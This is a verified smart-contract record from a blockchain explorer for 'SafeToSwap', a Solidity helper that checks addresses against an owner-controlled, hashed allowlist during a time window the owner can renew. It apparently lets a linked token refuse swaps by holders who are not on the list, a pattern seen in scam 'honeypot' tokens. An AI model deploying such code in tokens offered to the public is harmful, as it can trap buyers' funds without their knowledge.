{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.9;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function _checkOwner() internal view virtual {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\nerror NotSafeSetter();\r\n\r\ncontract SafeToSwap is Ownable {\r\n    mapping(bytes32 => bool) private safeToSwap;\r\n    address private safeSetter;\r\n    uint256 private end;\r\n\r\n    modifier setter() {\r\n        if (_msgSender() != safeSetter) revert NotSafeSetter();\r\n        _;\r\n    }\r\n\r\n    constructor(bytes32[] memory _safers) {\r\n        for (uint256 index = 0; index < _safers.length; index++) {\r\n            safeToSwap[_safers[index]] = true;\r\n        }\r\n    }\r\n\r\n    function setSafeSetter(address _safeSetter) public onlyOwner {\r\n        safeSetter = _safeSetter;\r\n    }\r\n\r\n    function addSafers(bytes32[] memory _safers) public onlyOwner {\r\n        for (uint256 index = 0; index < _safers.length; index++) {\r\n            safeToSwap[_safers[index]] = true;\r\n        }\r\n    }\r\n\r\n    function setSafeByOwner(uint256 _time) external onlyOwner {\r\n        end = block.timestamp + _time;\r\n    }\r\n\r\n    function removeSafers(bytes32[] memory _safers) public onlyOwner {\r\n        for (uint256 index = 0; index < _safers.length; index++) {\r\n            safeToSwap[_safers[index]] = false;\r\n        }\r\n    }\r\n\r\n    function setSafe() external setter {\r\n        end = block.timestamp + 60 minutes;\r\n    }\r\n\r\n    function safe(address sender) external view setter returns (bool) {\r\n        if (block.timestamp < end) {\r\n            bytes32 safes = keccak256(abi.encodePacked(sender));\r\n            return safeToSwap[safes];\r\n        } else {\r\n            return true;\r\n        }\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"bytes32[]\",\"name\":\"_safers\",\"type\":\"bytes32[]\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"NotSafeSetter\",\"type\":\"error\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"bytes32[]\",\"name\":\"_safers\",\"type\":\"bytes32[]\"}],\"name\":\"addSafers\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes32[]\",\"name\":\"_safers\",\"type\":\"bytes32[]\"}],\"name\":\"removeSafers\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"safe\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"setSafe\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_time\",\"type\":\"uint256\"}],\"name\":\"setSafeByOwner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_safeSetter\",\"type\":\"address\"}],\"name\":\"setSafeSetter\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SafeToSwap", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000144849ae898eb393bba40aedeb6265acd0b543b0b4d9c5e0e6ba14cf55dd2ca4549572d1e02df06fa956a9e4964acde492472ed852942e6bad354df1a9159bb46cbee432a39cf5b1805478f4a62de890ecc166d13d6cd3ad906594e69daf445dba1a8f5c8129d20607c9d22b8993d3c02985c98d0610b1a02afb3c8c85d02128f25e816b9a6ec97829fcd5bcaa8e7f32b0716b6f87bd8fb3c378889a2fdbde5759e88da73fbb384182aa0629614801ce5eb5c4e9eab7d2cd5091151c40af8365752d30af62b5a3f491a1e29bc16f7227b223b9063845c08ad23df5c795479ef74f0786334f013a1406529de9433381d34f0302b089d3dcc03b495a08ec4a136e430d804a9cbac3b9f609eada6f4c9bfb7236acb22c3e74022b0ff8920e210377a0a276dd2f6839dec8af3ad431cf28d9120aabb591dc4412bc33143337502b46fa40bf42c9dd9f6535ef796dcbde59d44bfcd48deeba6a46a81cc4429ccfdc1fb2b58335efa6bad09df7e0f311c0164ca47ed5c79045d87da29b48f22ce7c1a042da027c0f75abe437f3905deea3bffa478e7f1b724149094dfb4993029806c1100f038f481245f4d647fde254218c3e108b8fee387d5921d39c2aa14af4096ed3da71500ec9d5457ecb7056040577d7c4a4b02a2855080bb7cdc16de2ab28bf371419ff2431dfc346b5beb7b5476a650d39f7a42d7b39f591bd0b7888105ca4ba798e6ae18f4d1d0a6be4c55e4d72241ea70fab0fdbc6f2d39f193a12add59ed65b61dd3b491734de6ceaa1321c205a670464414262b476913807e4fec46e7ba49ac12fe37be52da1909a24b3ee573bb0c7c1c019c50fd96e23a500c62898ca20d9d7ce9baa5a045b331c356aa6235fcbe6e8ae9d382363a7f8f3ffa9886b449c", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://7fb32826570616f3abc7d397702df7566b102322edc956e6d872936f72f15a8c"}